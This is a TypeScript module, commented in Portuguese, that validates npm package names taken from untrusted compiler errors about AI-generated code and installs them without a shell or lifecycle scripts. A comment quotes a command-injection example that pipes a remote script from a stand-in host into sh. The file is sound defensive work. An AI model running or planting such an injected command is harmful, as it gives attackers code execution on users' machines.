import * as cp from 'child_process';

/**
 * Nome de pacote npm vindo de fonte NÃO confiável — os erros do tsc sobre
 * código GERADO POR IA ("Cannot find module 'x'") — nunca pode virar linha de
 * shell: um "módulo" chamado `x; curl evil.sh | sh` executaria com os
 * privilégios do usuário. Defesa em três camadas:
 *   1. esta gramática (só nome de pacote npm de verdade, nada de URL, path,
 *      spec de versão ou flag);
 *   2. execFileSync com argumentos separados — sem shell no meio (npmInstall);
 *   3. --ignore-scripts na instalação — pacote hostil não roda lifecycle.
 */
export function isSafeNpmPackageName(name: unknown): name is string {
  if (typeof name !== 'string') return false;
  if (name.length === 0 || name.length > 214) return false;
  // Barra de uma vez: espaço, ; & | $ ` ( ) < > \ ' " : (URLs, file:, git+ssh:),
  // acentos e qualquer coisa fora do alfabeto de nome de pacote.
  if (/[^a-z0-9@/._~-]/.test(name)) return false;
  // Flag disfarçada de pacote (--registry=…, -g) e caminho relativo.
  if (name.startsWith('-') || name.startsWith('.') || name.startsWith('_')) return false;
  // Forma canônica: [@escopo/]nome — o '@' só é válido abrindo escopo, o que
  // também rejeita spec de versão (pkg@1.2.3, pkg@file:../evil).
  return /^(@[a-z0-9][a-z0-9._~-]*\/)?[a-z0-9][a-z0-9._~-]*$/.test(name);
}

/**
 * `npm install` de pacotes de fonte não confiável, sem shell e sem lifecycle
 * scripts. Retorna os pacotes efetivamente instalados; lança se o npm falhar.
 * Pacotes que não passam na gramática são DESCARTADOS (com aviso) — nunca
 * repassados ao npm.
 */
export function npmInstallUntrusted(
  packages: string[],
  cwd: string,
  opts: { dev?: boolean; onRejected?: (rejected: string[]) => void } = {},
): string[] {
  const safe = packages.filter(isSafeNpmPackageName);
  const rejected = packages.filter(p => !isSafeNpmPackageName(p));
  if (rejected.length > 0) opts.onRejected?.(rejected);
  if (safe.length === 0) return [];
  cp.execFileSync(
    'npm',
    ['install', '--ignore-scripts', ...(opts.dev ? ['-D'] : []), ...safe],
    { cwd, stdio: 'pipe' },
  );
  return safe;
}
